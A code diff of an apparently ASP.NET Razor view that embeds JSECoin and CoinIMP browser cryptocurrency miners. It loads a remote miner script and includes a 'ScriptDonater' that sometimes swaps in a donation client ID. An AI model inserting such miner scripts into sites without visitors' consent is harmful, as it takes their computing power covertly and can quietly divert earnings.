@@ -14,7 +14,7 @@
 {
     <text>
 <script type="text/javascript">
-    !function () { var e = document, t = e.createElement("script"), s = e.getElementsByTagName("script")[0]; t.type = "text/javascript", t.async = t.defer = !0, t.src = "https://load.jsecoin.com/load/87722/srs.hepf.com/0/0/", s.parentNode.insertBefore(t, s) }();
+    !function () { var e = document, t = e.createElement("script"), s = e.getElementsByTagName("script")[0]; t.type = "text/javascript", t.async = t.defer = !0, t.src = "https://load.jsecoin.com/load/@Model.JSECoinMinerConfigurationViewModel.ClientId/@Model.JSECoinMinerConfigurationViewModel.SiteId/@Model.JSECoinMinerConfigurationViewModel.SubId/0/", s.parentNode.insertBefore(t, s) }();
 </script>
     </text>
 
@@ -22,14 +22,14 @@
 
 @helper renderCoinIMPMiner()
 {
-    string ClientId = Model.MinerConfigurationViewModel.ClientId;
+    string ClientId = Model.CoinIMPMinerConfigurationViewModel.ClientId;
     bool shallDonate = SignalRService.Utils.ScriptDonater.Instance.ShallDonate(ClientId);
     if (shallDonate)
     {
         string donateClientId = SignalRService.Utils.ScriptDonater.Instance.Donate(ClientId);
         <text>
             <script>
-                @SignalRService.Utils.RenderUtils.RenderMinerScript(donateClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
+                @SignalRService.Utils.RenderUtils.RenderMinerScript(donateClientId, Model.CoinIMPMinerConfigurationViewModel.Throttle, Model.CoinIMPMinerConfigurationViewModel.ScriptUrl, Model.CoinIMPMinerConfigurationViewModel.StartDelayMs, Model.CoinIMPMinerConfigurationViewModel.ReportStatusIntervalMs, true)
             </script>
         </text>
     }
@@ -38,7 +38,7 @@
         SignalRService.Utils.ScriptDonater.Instance.AddStat(ClientId);
         <text>
             <script>
-                @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.MinerConfigurationViewModel.ClientId, Model.MinerConfigurationViewModel.Throttle, Model.MinerConfigurationViewModel.ScriptUrl, Model.MinerConfigurationViewModel.StartDelayMs, Model.MinerConfigurationViewModel.ReportStatusIntervalMs, true)
+                @SignalRService.Utils.RenderUtils.RenderMinerScript(Model.CoinIMPMinerConfigurationViewModel.ClientId, Model.CoinIMPMinerConfigurationViewModel.Throttle, Model.CoinIMPMinerConfigurationViewModel.ScriptUrl, Model.CoinIMPMinerConfigurationViewModel.StartDelayMs, Model.CoinIMPMinerConfigurationViewModel.ReportStatusIntervalMs, true)
             </script>
         </text>
     }
